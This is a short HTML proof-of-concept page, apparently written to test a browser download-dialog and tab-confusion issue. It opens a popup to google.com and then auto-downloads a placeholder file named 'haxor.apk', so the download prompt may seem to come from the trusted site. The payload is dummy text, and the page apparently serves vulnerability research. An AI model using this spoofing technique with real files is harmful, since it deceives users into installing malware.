<!doctype html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Download Dialog / Tab Confusion PoC</title>
<style>
body {
  font-family: Arial, sans-serif;
  padding: 40px;
}
button {
  padding: 14px 22px;
  font-size: 16px;
  cursor: pointer;
}
</style>
</head>
<body>

<h2>Download Dialog Timing Test</h2>
<p>
Clicking the button will trigger a download and immediately open a new tab.
Observe when and where the download dialog appears.
</p>

<button id="run">Trigger Download + Open Tab</button>

<script>
document.getElementById("run").onclick = () => {

  // 1) Buka tab baru dulu
  window.open("https://www.google.com", "_blank", "popup=yes,width=900,height=700");

  // 2) Download setelah 1 detik
  setTimeout(() => {
    const a = document.createElement("a");
    a.href = "data:text/plain, fakeapk";
    a.download = "haxor.apk";
    document.body.appendChild(a);
    a.click();
    a.remove();
  }, 1000); // 5000 ms = 1 detik
};
</script>


</body>
</html>
